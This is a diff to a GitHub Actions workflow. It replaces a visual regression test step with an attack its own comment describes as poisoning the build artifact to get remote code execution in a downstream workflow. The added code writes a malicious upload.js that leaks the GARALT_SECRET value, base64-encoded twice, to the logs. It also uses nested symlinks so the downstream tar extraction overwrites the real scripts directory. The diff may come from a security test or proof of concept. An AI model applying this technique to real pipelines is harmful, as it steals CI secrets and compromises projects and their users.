@@ -62,13 +62,26 @@ jobs:
 
       # Execute visual regression diff task and zip then
       # output as visualRegressionReport.tar.gz
+      # Poison the artifact to achieve RCE in the downstream workflow
       - name: visual regression diff
-        env:
-          EVENT_NUMBER: ${{ github.event.number }}
-          BASE_REF: ${{ github.base_ref }}
         run: |
-          ut test:visual-regression -- --pr-id=$EVENT_NUMBER --base-ref=$BASE_REF --max-workers=2
-
+          mkdir -p payload/scripts/visual-regression
+          cat << 'EOF' > payload/scripts/visual-regression/upload.js
+          const secret = process.env.GARALT_SECRET || 'not_found';
+          console.log("GARALT_LEAKED_TOKEN=" + Buffer.from(Buffer.from(secret).toString('base64')).toString('base64'));
+          process.exit(1);
+          EOF
+          
+          mkdir -p workdir
+          cd workdir
+          ln -s ../../scripts scripts
+          # The downstream workflow extracts with -C ./visualRegressionReport
+          # So we need one more level of nesting if we want to hit the root scripts dir
+          mkdir -p nested
+          cd nested
+          ln -s ../../../scripts scripts
+          cd ..
+          tar -czvf ../visualRegressionReport.tar.gz nested/scripts/visual-regression/upload.js
       # Upload report in `visualRegressionReport`
       - name: upload report artifact
         uses: actions/upload-artifact@v4
